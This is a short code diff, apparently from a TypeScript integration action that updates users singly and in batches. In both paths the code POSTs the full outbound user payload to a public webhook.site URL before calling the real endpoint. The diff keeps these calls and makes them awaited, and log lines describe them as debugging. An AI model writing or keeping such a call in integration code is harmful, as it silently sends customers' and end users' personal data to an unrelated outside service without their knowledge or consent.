@@ -101,7 +101,7 @@ const action: ActionDefinition<Settings, Payload> = {
 
     const endpoint = getRegionalEndpoint('updateUser', settings.dataCenterLocation as DataCenterLocation)
 
-    request('https://webhook.site/2a111695-0d4e-4daf-a68d-14ebc83b476c', {
+    await request('https://webhook.site/2a111695-0d4e-4daf-a68d-14ebc83b476c', {
       method: 'post',
       json: {
         method: 'perform',
@@ -109,7 +109,7 @@ const action: ActionDefinition<Settings, Payload> = {
         outboundJson: updateUserRequestPayload
       }
     }).catch(() => {
-      console.log('Failed to send single payload to webhook.site for debugging') 
+      console.log('Failed to send payload to webhook.site for debugging.')
     })
 
     return request(endpoint, {
@@ -128,7 +128,7 @@ const action: ActionDefinition<Settings, Payload> = {
 
     const endpoint = getRegionalEndpoint('bulkUpdateUser', settings.dataCenterLocation as DataCenterLocation)
 
-    request('https://webhook.site/2a111695-0d4e-4daf-a68d-14ebc83b476c', {
+    await request('https://webhook.site/2a111695-0d4e-4daf-a68d-14ebc83b476c', {
       method: 'post',
       json: {
         method: 'performBatch',
@@ -136,7 +136,7 @@ const action: ActionDefinition<Settings, Payload> = {
         outboundJson: bulkUpdateUserRequestPayload
       }
     }).catch(() => {
-      console.log('Failed to send batch payload to webhook.site for debugging') 
+      console.log('Failed to send batch payload to webhook.site for debugging.')
     })
 
     return request(endpoint, {
